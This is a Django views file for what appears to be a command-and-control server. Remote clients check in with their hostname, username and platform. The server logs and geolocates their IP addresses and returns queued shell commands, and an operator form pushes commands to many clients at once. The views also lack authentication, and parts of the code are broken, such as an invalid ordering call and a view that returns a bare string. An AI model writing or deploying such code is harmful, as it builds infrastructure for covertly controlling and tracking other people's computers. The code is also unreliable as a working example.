import json
import base64
import os
from datetime import datetime
import tempfile
import shutil
from ipware import get_client_ip

from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required
from django.views.generic.list import ListView
from django.views.generic.detail import DetailView
from .models import Client, Command, Upload
from .utils import geolocate
from .forms import RegisterUserForm, CommandAllForm, HandleUploadsForm

class ClientDetailView(DetailView):
    model = Client

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        return context

class ClientListView(ListView):
    model = Client
    paginate_by = 50
    form_class = CommandAllForm

    def get(self, request, *args, **kwargs):
        form = self.form_class
        return render(request, 'client_list.html', {'form': form})

    def post(self, request, *args, **kwargs):
        form = self.form_class(request.POST)
        if form.is_valid():
            clients = form.cleaned_data['clients']
            for client_id in clients:
                client = Client.objects.get(pk=client_id)
                client.send_command(form.cleaned_data['cmdline'])

        return render(request, 'client_list.html', {'form': self.form_class})

def index(request):
    return render(request, 'index.html')

def register(request):
    if request.method == 'POST':
        form = RegisterUserForm(request.POST)
        if form.is_valid():
            form.save()
        return redirect('/')
    else:
        form = RegisterUserForm()

    return render(request, 'register.html', {'form': form})

def initial(request, client_id):
    try:
        client = Client.objects.get(pk=client_id)
    except Client.DoesNotExist:
        client = Client.objects.create(pk=client_id)

    if request.method == 'POST':
        info = json.loads(request.body)
        if info:
            if 'platform' in info:
                client.operating_system = info['platform']
            if 'hostname' in info:
                client.hostname = info['hostname']
            if 'username' in info:
                client.username = info['username']
        client.last_online = datetime.now()
        remote_ip, is_routable = get_client_ip(request)
        if remote_ip is not None and is_routable:
            client.remote_ip = remote_ip
            client.location = geolocate(client.remote_ip)
        else:
            client.remote_ip = None
            client.location = None
        client.save()
        commands_to_run = ''
        command = client.commands.order_by(Command.timestamp.desc()).first()
        if command:
            commands_to_run = command.cmdline
            command.delete()
        return commands_to_run

def list_uploads(request):
    uploads = Upload.objects.all()
    return render(request, 'uploads.html', {'uploads': uploads})

def upload(request):
    if request.method == 'POST':
        form = HandleUploadsForm(request.POST, request.FILES)
        if form.is_valid():
            form.save()
            return redirect('uploads')
    else:
        form = HandleUploadsForm()
    return render(request, 'upload.html', {'form': form})

def delete_upload(request, upload_id):
    if request.method == 'POST':
        upload = Upload.objects.get(pk=upload_id)
        upload.delete()
    return redirect('uploads')
